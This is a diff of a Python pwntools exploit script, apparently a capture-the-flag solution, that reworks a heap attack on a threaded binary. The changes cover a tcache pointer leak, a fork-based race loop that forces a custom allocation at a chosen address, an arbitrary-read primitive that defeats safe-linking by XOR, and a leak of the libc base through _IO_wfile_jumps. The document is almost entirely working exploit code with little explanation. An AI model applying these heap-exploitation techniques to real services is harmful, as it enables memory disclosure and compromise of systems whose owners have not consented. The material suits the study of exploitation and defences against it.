@@ -20,7 +20,8 @@ TRIES = 10000
 
 p.context.arch = 'amd64'
 args = None
-proc, elf, libc = (None, None, None)
+proc, elf = (None, None)
+libc : p.ELF # f*cking LSP
 gdb_pid = 0
 pids = []
 
@@ -218,7 +219,9 @@ def get_tcache_leak(thd1, thd2):
 
 def setup_custom_alloc(thd1, thd2, target_addr):
     packed_addr = p.p64(target_addr)
-    cmped_addr  = packed_addr.split(b'\x00')[0].strip()
+    cmped_addr  = packed_addr.split(b'\x00')[0].split()[0]
+    if len(cmped_addr) <= 1:
+        raise ValueError("Compared addr is too small")
 
     idx = thd1.get_available_idx()
     thd1.malloc(idx)
@@ -226,7 +229,8 @@ def setup_custom_alloc(thd1, thd2, target_addr):
     thd1.free(idx+1)
 
     failed = True
-    scanf_bytes = b"scanf %d" % idx + b' ' + packed_addr + b'\n'
+    scanf_bytes = b"scanf %d " % idx + packed_addr + b'\n'
+    print(scanf_bytes)
     for _ in range(TRIES):
         if not os.fork():
             thd1.free(idx)
@@ -248,7 +252,7 @@ def setup_custom_alloc(thd1, thd2, target_addr):
         # import IPython; IPython.embed()
         return b""
 
-    p.context.log_level  = "debug"
+    # p.context.log_level = "debug"
     # attach_gdb('''
     #     b malloc
     #     c
@@ -262,12 +266,18 @@ def setup_custom_alloc(thd1, thd2, target_addr):
 
 # maybe check if target_addr is a mod of 16
 def arbitrary_read(thd1, thd2, target_addr: int):
-    idx = setup_custom_alloc(thd1, thd2, target_addr)
+    try:
+        idx = setup_custom_alloc(thd1, thd2, target_addr)
+    except ValueError as v:
+        print(v)
+        return b""
+
     return thd1.printf(idx)
 
 
 def leak_libc():
     thd1, thd2 = (None, None)
+    libc_leak  = b""
     for _ in range(TRIES):
         thd1 = thread_comm()
         thd2 = thread_comm()
@@ -275,54 +285,28 @@ def leak_libc():
         tcache_xored_loc = get_tcache_leak(thd1, thd2)
         if not tcache_xored_loc:
             print(b"No tcache leak...")
-            continue
-        print("tcache xored loc:", hex(tcache_xored_loc))
+            return 
 
-        target_addr = (tcache_xored_loc << 12) + 0xd40
+        target_addr  = (tcache_xored_loc << 12) + 0xd40
+        target_xored = target_addr ^ tcache_xored_loc
         print("Target addr:", hex(target_addr))
-        target_addr ^= tcache_xored_loc
-        print("Target addr (xored):", hex(target_addr))
-        idx = setup_custom_alloc(thd1, thd2, target_addr)
+        print("Target addr: (xored)", hex(target_xored))
 
-        thd1.scanf(idx, p.cyclic(15))
-        attach_gdb("b fprintf\nc", pause=True)
-        libc_leak = thd1.printf(idx)
+        libc_leak = (arbitrary_read(thd1, thd2, target_xored))
+        if libc_leak != b"":
+            break
 
-        print(libc_leak, "\n")
-        if (len(libc_leak[16:]) != 6):
-            restart_server()
-            continue
-
-        print(to_addr(libc_leak))
+        restart_server()
         # attach_gdb(pause=True)
 
-    return (thd1, thd2)
+    return (thd1, thd2, to_addr(libc_leak))
 
 
 def exploit():
-    # attach_gdb('''
-    #     b challenge
-    #     c
-    #     b malloc
-    #     b free
-    #     c
-    #     finish
-    # ''')
-    # thd1, thd2 = leak_libc()
-    
-    thd1 = thread_comm()
-    thd2 = thread_comm()
-
-    tcache_xored_loc = get_tcache_leak(thd1, thd2)
-    if not tcache_xored_loc:
-        print(b"No tcache leak...")
-        return 
-    target_addr = (tcache_xored_loc << 12) + 0xd40
-    print("Target addr:", hex(target_addr))
-    target_addr ^= tcache_xored_loc
-    print("Target addr: (xored)", hex(target_addr))
-    data = arbitrary_read(thd1, thd2, target_addr)
-    print(data)
+    thd1, thd2, libc_leak = leak_libc()
+    libc.address = libc_leak - libc.symbols['_IO_wfile_jumps']
+    print("libc leak:", hex(libc_leak))
+    print("libc address", hex(libc.address))
 
     attach_gdb(pause=True)
 
